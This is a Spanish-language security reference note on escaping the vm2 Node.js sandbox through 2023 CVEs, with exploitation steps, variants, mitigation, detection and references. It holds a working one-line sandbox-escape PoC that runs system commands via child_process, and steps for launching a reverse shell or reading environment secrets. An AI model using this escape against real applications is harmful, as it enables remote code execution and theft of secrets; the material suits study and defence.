---
topic: vm2 — escape del sandbox JavaScript
tags: [web, nodejs, vm2, sandbox-escape, rce]
---

# vm2 — escape del sandbox JavaScript

[🇬🇧 English](vm2-sandbox-escape.en.md) | **Español**

## Concepto

vm2 intenta aislar código JavaScript no confiable dentro de un contexto separado. Varias CVEs de 2023 permiten romper ese aislamiento desde el propio código del usuario y alcanzar `process`, `require` y `child_process`.

## Cuándo aplica

- Una aplicación ejecuta código de usuarios con vm2.
- La versión es 3.9.16 o anterior.
- El proceso Node.js tiene acceso a red o secretos.

## Procedimiento

1. Confirmar la versión en `package.json` o en la respuesta.
2. Elegir un PoC para CVE-2023-32314, 30547, 37466 o 37903.
3. Ejecutar `process.mainModule.require('child_process')`.
4. Lanzar una reverse shell o leer variables de entorno.

```javascript
const { VM } = require("vm2");
new VM().run('err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("id"); } }) }; err.stack;');
```

## Variantes

- `Error.prepareStackTrace` para obtener el host.
- `WebAssembly` o `Proxy` para saltar el contexto.
- `require` de módulos nativos para escribir archivos.

## Limitaciones

- La versión parcheada bloquea el PoC.
- Un contenedor sin herramientas limita el post-explotación.
- `--experimental-vm-modules` puede cambiar el comportamiento.

## Mitigación

- Actualizar vm2 o migrar a `isolated-vm`.
- No ejecutar código de usuarios en el proceso principal.
- Aplicar seccomp, sin red y sin secretos al sandbox.

## Detección

- Procesos hijos de Node.js inesperados.
- Uso de `child_process` desde el servicio del playground.
- Versiones vulnerables en el inventario.

## Referencias

- [Snyk — vm2 CVE-2023-32314](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100)
- [0xdf — Codify](https://0xdf.gitlab.io/2024/04/06/htb-codify.html)
- [vm2 — project shutdown](https://github.com/patriksimek/vm2/issues/533)
